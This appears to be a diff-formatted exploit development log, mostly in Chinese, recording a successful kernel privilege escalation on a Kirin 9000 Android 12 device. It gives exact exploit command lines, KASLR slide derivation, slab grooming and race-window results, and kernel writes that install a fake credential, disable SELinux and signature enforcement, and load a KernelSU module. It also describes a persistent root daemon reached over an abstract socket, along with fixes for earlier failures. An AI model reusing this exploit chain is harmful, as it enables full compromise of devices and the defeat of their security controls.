+- [B15] GATE=PASS alloc_round=4；SIDFIX sid=68 rc=0；wake1/wake2 rc=1 errno=0
+- probe 已唤醒（/proc/15759 comm=FC_WAKE，uid=0）★
+- trace_marker 打点：KK enter fakecred_run uid=0 → KK P1 done → KK sock=11 → KK bind/listen FAIL errno=13(EACCES)
+- 根因：代码把抽象 socket 名写成字面 '@kk98260'（sun_path[0]='@'），在 init 域变成“在 /data/local/tmp 创建文件 socket”，init 无 shell_data_file 写权限 → EACCES
+- 修复：sun_path[0]='\0'，名从 sun_path+1 开始，长度=offsetof+1+strlen；产物 wr93x md5=6C439BC3
+- 清理: 保留锚点 15738 + probe 15759（禁止 kill），清 8 个子进程；slabdata 12, MemFree 7456MB
+
+[19] 2026-11-08 16:55 ★★成功：常驻 root 守护（init 域）成立
+- boot=927a2347 uptime=332s slabdata_before=6 slide=0x1b20c00000
+- wr93x（抽象 socket 修复版）: [B15] GATE=PASS alloc_round=2；SIDFIX sid=68；wake1/wake2 rc=1
+- trace: KK enter fakecred_run uid=0 → KK P1 done → KK sock=11 → KK ready @kk98260 uid=0
+- /proc/net/unix 出现 @kk98260；kkcli（已修同名 bug）连接成功
+- 实测: kkcli kk98260 id → uid=0 euid=0 gid=0；ctx=u:r:init:s0
+- 实测: kkcli kk98260 "ls /data/adb" → 正常列出 root-only 目录；"cat /proc/sys/kernel/random/boot_id" → 927a2347-...
+- 清理: 保留锚点 wr93x 17204 + 守护 17227（FC_WAKE，禁止 kill），清 8 个 filler；slabdata 15→11, MemFree 7248MB
+
+[2026-11-09 23:07 ★★成功] KO 加载 Live（wr93k1，boot=6f490459）
+- 设备: Kirin 9000 / LTO-AL00 / Android 12 / Linux 5.10.43 #1 SMP Wed Jan 7 17:43:59 CST 2026
+- PRE: uptime=299s | slabdata=6/6 (272B, 30/slab, 2 pages/slab) | kernelsu count=0 | relay uid=0 context=u:r:init:s0
+- slide=0x19e1200000（★真值；skslide2 本机输出偏 +0x80000(bit19)，禁止直接采信）
+  反解证据: gtest setresgid → kmem_cache_alloc req=192 cs=0xffffffd9f13e38d4（多 pid 一致）
+  cs - CRED_CS_LINK(0xffffffc0101e38d4) = 0x19e1200000
+  交叉自洽: misc_list 链接 0xffffffc0135c7860 + slide = 0xffffffd9f47c7860 = 烘焙 imm 值
+- 烘焙: kk34_234c200000.ko → kk34_19e1200000.ko
+  delta=0xfffffff695000000 | imm_sites=1 | syms=188 | .init.text+0x0640: 0xffffffe35f7c7860 → 0xffffffd9f47c7860
+  烘后 md5=22e53643461476aef02337c20baebf2b size=3810488
+- 二进制: wr93k1 md5=D8313C7E7DA6E8940FDB1961A872B6B5 size=1788080
+  = wr93d(md5 B1DD8DDCA8878AC62F736062456A76BC) + wr1.c#L4816 后补 `g_dn = 0;`
+- 命令: SIDCTX=u:r:init:s0 SIDFIX=68 ./wr93k1 -I -U FCFORK -m /data/local/tmp/kk34_19e1200000.ko -t -W -s 0x19e1200000 -n 631 -p 60 -g 8 -y 1200 -a 4
+- B0c: cred_cs=0xffffffd9f13e38d4 timer_cs=0xffffffd9f14bf748 task_cs=0xffffffd9f13930a8 self_tid=15071 ncpu=6 vcpu=1
+- B1a: probe=15092 setresgid(2000)=0 errno=0
+- B1b: 70 条(<128 未溢出) 尾部 cs=0xffffffd9f13e38d4 req=192
+- B1: cred records=2 va=0xffffff8058d53480 | probe_task records=1 va=0xffffff82d58c0000 (tid=15071)
+- B1c: cred[4] va=0xffffff828d490e40; cred[380] va=0xffffff8058d53480 delta=0xfffffffdcb8c2640; task[3] va=0xffffff82d58c0000
+- B1 模式=stage1 插入 misc_list | B6 fillers=6 [BCDEFA]
+- attempt 1/4 即中:
+  B2h filler 15116=114 timer, 15117=29 timer, holes=0
+  B2 victim=15118 tid=15119 timers=631 recs=631 slabs=22 last_slab=361214
+  B2d groups=22 满30=20 | 29:3177770 30:317982 30:321212 30:321214 30:312872 30:312874 30:360968 30:360970
+  B2a arm_i=58 addr=0xffffff804da1fed0
+  B2b slab pfn=317982 cnt=30 node=0xffffff804da1ff58 off=0xf58 pfn=317983 head=317982
+  B7 pre-go slabdata=31 (930 objs)
+  K de_thread 543us → SIGKILL | B8 reads=64 opens=72350 err=0 go+510us det+33us kill+543us
+  WINDOW HIT (attempt 1)
+  B12F fake_cred=0xffffff804da1f100 tsec=0xffffff804da1f1c0 | B12A fake_avc_node=0xffffff804da1f1f0
+  B12T slots=10 skip=5 | B12I off=0xf58 aux=0x400 P=0xffffff804da1f400 Pnode=0xffffff804da1f418 Q=0xffffff804da1f580 F=0xffffff804da1f640 misc_list=0xffffffd9f47c7860
+  B12c F_SETPIPE_SZ ret=1048576 pipes=60
+  B13 pipe pages=2048 in 150679us | free pfn=317982 order=1 | alloc pfn=317983 order=0 mt=0 GFP_HIGHUSER by 15071
+  B15 GATE=PASS (mine_unmov=1 mine=1 any=1) alloc_round=1 free_cnt=1
+  B15w 800ms extra_free=0 | B16 REAP 15118 | B17 status=0x9
+  B20 /dev/uhid=134 | B21 pwrite=128 | B22 /dev/uhid=135
+  VERDICT: STAGE1 桥就绪 | B19 rc=0
+- F: task=0xffffff82d58c0000 fake_cred=0xffffff804da1f100 tsec=0xffffff804da1f1c0
+  sig_enforce(0xffffffd9f472d468)<-0 | real_cred/cred<-0xffffff804da1f100 | SIDFIX sid=68
+  task->pid/tgid(0x878)<-0 | avc key ssid=tsid=68 | avc pprev(+0x30)<-bucket 0xffffffd9f4b476c8
+  avc slots[276]@0xffffffd9f4b476c8 -> fake_list 0xffffff804da1f218 | selinux_state@0xffffffd9f4b4ae68<-0
+  A17 const_caps_ready 0xffffffd9f49fc6bc<-1 | bti key 0xffffffd9f49fc660<-0 | wake1 fd=10 rc=1
+  FC 时间线: +0ms wpAAAAAAABBBBBB → +2ms FC_WAKE → +7ms FC_CALL → +174ms FC_OK0 → +2171ms FC_DONE
+  root_probe_patch rc=0 | wake2 fd=10 rc=1 | module 预读 3810488/3810488
+- 结果: /proc/modules → `kernelsu 147456 0 - Live 0x0000000000000000 (OE)`
+  成功时 uptime=349s | boot_id 未变 6f490459 | 无 panic
+- 收尾: 仅关 kmem_cache_alloc/mm_page_alloc/mm_page_free/tracing_on；不 kill 任何 wr93k1/victim/probe
+- ★ 两条关键修正（之前失败根因）:
+  1) skslide2 本机输出偏 +0x80000（bit19），必须用 gtest cred 分配反解真 slide
+  2) wr1.c#L4816 漏 `g_dn = 0;`，exec /proc/self/exe 的分配会占满 g_d[128]，导致 cred records=0
+
+[2026-11-09 23:3x ✗崩溃复盘] 加载成功后 kill 主控导致 panic 重启
+- 操作: kernelsu Live 后 kill -9 主控 15071（先 15116 filler）→ 数秒内 panic
+- boot 6f490459-7ba5-4683-861c-579b95dfe421 → 9f06fcfe-ff02-4013-9d93-5e24c46f3273
+- 重启后 uptime=139s kernelsu=0 无残留
+- ★ 结论: 模块加载后绝不能 kill 任何 wr93k1/probe/victim/filler；只关 trace 事件（05_cleanup.sh 安全版）
+- 复现包: d:\98260\kk34_KO_repro_20261109.zip
